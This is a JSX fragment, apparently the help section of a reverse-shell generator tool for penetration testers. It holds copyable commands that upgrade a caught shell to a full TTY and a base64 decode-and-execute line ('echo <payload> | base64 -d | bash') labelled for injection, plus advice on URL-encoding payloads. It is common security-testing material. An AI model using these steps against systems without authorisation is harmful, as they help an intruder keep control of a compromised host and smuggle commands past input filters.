                <h3>Upgrade your shell</h3>
                <p>After catching a basic shell, get a proper TTY:</p>
                <div class={`rs-code rs-code-sm${flash === 'tip' ? ' rs-glow' : ''}`} onClick={() => copy("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\nexport TERM=xterm-256color", 'tip')}>
                  <pre>{"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\nexport TERM=xterm-256color"}</pre>
                </div>
              </>)}

              <h3>Encoding</h3>
              <p><strong>Raw</strong> — paste directly into a terminal.</p>
              <p><strong>Base64</strong> — for injection: <code>{"echo <payload> | base64 -d | bash"}</code></p>
              <p><strong>URL Encode</strong> — for payloads in URL parameters where <code>&amp;</code> <code>|</code> <code>;</code> would break.</p>
            </div>
          </details>
        </div>
      )}
    </div>
  );
}
